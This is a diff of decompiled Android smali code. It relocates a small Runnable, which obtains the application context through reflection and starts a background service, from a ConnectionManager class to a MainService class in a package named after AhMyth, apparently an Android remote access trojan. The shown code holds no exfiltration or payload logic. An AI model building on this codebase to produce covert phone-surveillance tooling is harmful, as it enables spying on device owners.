@@ -1,6 +1,6 @@
-.class Lahmyth/mine/king/ahmyth/ConnectionManager$1;
+.class Lahmyth/mine/king/ahmyth/MainService$1;
 .super Ljava/lang/Object;
-.source "ConnectionManager.java"
+.source "MainService.java"
 
 # interfaces
 .implements Ljava/lang/Runnable;
@@ -8,7 +8,7 @@
 
 # annotations
 .annotation system Ldalvik/annotation/EnclosingMethod;
-    value = Lahmyth/mine/king/ahmyth/ConnectionManager;->findContext()V
+    value = Lahmyth/mine/king/ahmyth/MainService;->findContext()V
 .end annotation
 
 .annotation system Ldalvik/annotation/InnerClass;
@@ -25,8 +25,8 @@
 .method constructor <init>(Ljava/lang/reflect/Method;)V
     .locals 0
 
-    .line 88
-    iput-object p1, p0, Lahmyth/mine/king/ahmyth/ConnectionManager$1;->val$currentApplication:Ljava/lang/reflect/Method;
+    .line 38
+    iput-object p1, p0, Lahmyth/mine/king/ahmyth/MainService$1;->val$currentApplication:Ljava/lang/reflect/Method;
 
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
@@ -38,9 +38,9 @@
 .method public run()V
     .locals 3
 
-    .line 94
+    .line 41
     :try_start_0
-    iget-object v0, p0, Lahmyth/mine/king/ahmyth/ConnectionManager$1;->val$currentApplication:Ljava/lang/reflect/Method;
+    iget-object v0, p0, Lahmyth/mine/king/ahmyth/MainService$1;->val$currentApplication:Ljava/lang/reflect/Method;
 
     const/4 v1, 0x0
 
@@ -56,8 +56,8 @@
 
     if-eqz v0, :cond_0
 
-    .line 98
-    invoke-static {v0}, Lahmyth/mine/king/ahmyth/ConnectionManager;->start(Landroid/content/Context;)V
+    .line 43
+    invoke-static {v0}, Lahmyth/mine/king/ahmyth/MainService;->startService(Landroid/content/Context;)V
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
